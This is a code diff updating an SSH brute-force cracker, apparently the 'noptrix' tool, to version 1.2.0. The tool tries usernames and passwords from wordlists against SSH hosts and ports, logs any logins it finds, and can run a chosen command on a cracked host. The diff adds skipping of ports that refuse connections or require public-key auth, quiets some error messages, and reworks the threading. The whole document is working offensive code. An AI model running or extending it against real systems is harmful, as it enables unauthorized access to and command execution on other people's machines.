@@ -26,7 +26,8 @@ import socket
 import time
 import random
 import ipaddress
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor, as_completed, wait, \
+  ALL_COMPLETED
 import warnings
 import logging
 import masscan
@@ -36,7 +37,7 @@ from collections import deque
 
 
 __author__ = 'noptrix'
-__version__ = '1.1.3'
+__version__ = '1.2.0'
 __copyright = 'santa clause'
 __license__ = 'MIT'
 
@@ -163,6 +164,8 @@ opts = {
   'exit': False,
   'verbose': False
 }
+
+excluded = {}
 
 
 def log(msg='', _type='normal', esc='\n'):
@@ -292,8 +295,6 @@ def check_argv(cmdline):
   if '-m' in cmdline:
     if '-h' in cmdline or '-l' in cmdline or '-s' in cmdline or '-b' in cmdline:
       modes = True
-    #if not [s for s in cmdline if '--source-ip' in s]:
-    #  log('--source-ip <some_ipaddr> is needed for -m option', 'error')
   if '-s' in cmdline:
     if '-h' in cmdline or '-m' in cmdline or '-l' in cmdline or '-b' in cmdline:
       modes = True
@@ -388,29 +389,34 @@ def status(future, msg):
 
 
 def crack_login(host, port, username, password):
+  global excluded
+
   cli = paramiko.SSHClient()
   cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
   try:
-    cli.connect(host, port, username, password, timeout=opts['ctimeout'],
-      allow_agent=False, look_for_keys=False, auth_timeout=opts['ctimeout'])
-    login = f'{host}:{port}:{username}:{password}'
-    log_targets(f'{login}\n', opts['logfile'])
-    if opts['verbose']:
-      log(f'found login: {login}', _type='good')
-    else:
-      log(f'found a login (check {opts["logfile"]})', _type='good')
-    if opts['cmd']:
-      log('sending your ssh command', 'info')
-      stdin, stdout, stderr = cli.exec_command(opts['cmd'], timeout=2)
-      log('ssh command results', 'good')
-      for line in stdout.readlines():
-        log(line)
-    return SUCCESS
+    if port not in excluded[host]:
+      cli.connect(host, port, username, password, timeout=opts['ctimeout'],
+        allow_agent=False, look_for_keys=False, auth_timeout=opts['ctimeout'])
+      login = f'{host}:{port}:{username}:{password}'
+      log_targets(f'{login}\n', opts['logfile'])
+      if opts['verbose']:
+        log(f'found login: {login}', _type='good')
+      else:
+        log(f'found a login (check {opts["logfile"]})', _type='good')
+      if opts['cmd']:
+        log('sending your ssh command', 'info')
+        stdin, stdout, stderr = cli.exec_command(opts['cmd'], timeout=2)
+        log('ssh command results', 'good')
+        for line in stdout.readlines():
+          log(line)
+      return SUCCESS
   except paramiko.AuthenticationException as err:
     if opts['verbose']:
       if 'publickey' in str(err):
         reason = 'pubkey auth'
+        log(f'pubkey auth: {host}:{port} (excluding this target)', 'warn')
+        excluded[host].add(port)
       elif 'Authentication failed' in str(err):
         reason = 'auth failed'
       elif 'Authentication timeout' in str(err):
@@ -420,12 +426,17 @@ def crack_login(host, port, username, password):
       log(f'login failure: {host}:{port} ({reason})', 'warn')
     else:
       pass
-  except (paramiko.SSHException, socket.error):
-    if opts['verbose']:
-      log(f'could not connect: {host}:{port}', 'warn')
+  except (paramiko.ssh_exception.NoValidConnectionsError, socket.error):
+    log(f'could not connect: {host}:{port} (excluding this target)', 'warn')
+    excluded[host].add(port)
+  except paramiko.SSHException as err:
+    #if opts['verbose']:
+    #  log(f'paramiko: {str(err)}', 'warn')
+    pass
   except Exception as err:
-    if opts['verbose']:
-      log(f'something went wrong: {str(err)}', 'warn')
+    pass
+    #if opts['verbose']:
+    #  log(f'other error: {str(err)}', 'warn')
   finally:
     cli.close()
 
@@ -433,51 +444,56 @@ def crack_login(host, port, username, password):
 
 
 def run_threads(host, ports, val='single'):
+  global excluded
   futures = deque()
+
+  excluded[host] = set()
 
   with ThreadPoolExecutor(opts['sthreads']) as e:
     for port in ports:
-      futures.append(e.submit(crack_login, host, port, opts['user'],
-        opts['pass']))
+      if port not in excluded[host]:
+        futures.append(e.submit(crack_login, host, port, opts['user'],
+          opts['pass']))
+    wait(futures, None, ALL_COMPLETED)
 
-      with ThreadPoolExecutor(opts['lthreads']) as exe:
-        if 'userlist' in opts:
-          uf = open(opts['userlist'], 'r', encoding='latin-1')
-        if 'passlist' in opts:
+    with ThreadPoolExecutor(opts['lthreads']) as exe:
+      if 'userlist' in opts:
+        uf = open(opts['userlist'], 'r', encoding='latin-1')
+      if 'passlist' in opts:
+        pf = open(opts['passlist'], 'r', encoding='latin-1')
+      if 'combolist' in opts:
+        cf = open(opts['combolist'], 'r', encoding='latin-1')
+
+      if 'userlist' in opts and 'passlist' in opts:
+        for u in uf:
           pf = open(opts['passlist'], 'r', encoding='latin-1')
-        if 'combolist' in opts:
-          cf = open(opts['combolist'], 'r', encoding='latin-1')
-
-        if 'userlist' in opts and 'passlist' in opts:
-          for u in uf:
-            pf = open(opts['passlist'], 'r', encoding='latin-1')
-            for p in pf:
-              futures.append(exe.submit(crack_login, host, port, u.rstrip(),
-                p.rstrip()))
-
-        if 'userlist' in opts and 'passlist' not in opts:
-          for u in uf:
-            futures.append(exe.submit(crack_login, host, port, u.rstrip(),
-              opts['pass']))
-
-        if 'passlist' in opts and 'userlist' not in opts:
           for p in pf:
-            futures.append(exe.submit(crack_login, host, port, opts['user'],
+            futures.append(exe.submit(crack_login, host, port, u.rstrip(),
               p.rstrip()))
 
-        if 'combolist' in opts:
-          for line in cf:
-            try:
-              l = line.split(':')
-              futures.append(exe.submit(crack_login, host, port, l[0].rstrip(),
-                l[1].rstrip()))
-            except IndexError:
-              log('combo list format: <user>:<pass>', 'error')
+      if 'userlist' in opts and 'passlist' not in opts:
+        for u in uf:
+          futures.append(exe.submit(crack_login, host, port, u.rstrip(),
+            opts['pass']))
 
-        if opts['exit']:
-          for x in as_completed(futures):
-            if x.result() == SUCCESS:
-              os._exit(SUCCESS)
+      if 'passlist' in opts and 'userlist' not in opts:
+        for p in pf:
+          futures.append(exe.submit(crack_login, host, port, opts['user'],
+            p.rstrip()))
+
+      if 'combolist' in opts:
+        for line in cf:
+          try:
+            l = line.split(':')
+            futures.append(exe.submit(crack_login, host, port, l[0].rstrip(),
+              l[1].rstrip()))
+          except IndexError:
+            log('combo list format: <user>:<pass>', 'error')
+
+      if opts['exit']:
+        for x in as_completed(futures):
+          if x.result() == SUCCESS:
+            os._exit(SUCCESS)
 
   return
 
@@ -619,6 +635,7 @@ def main(cmdline):
   check_argv(cmdline)
   futures = deque()
 
+  log('game started', 'info')
   try:
     if '-h' in cmdline:
       log('cracking single target', 'info')
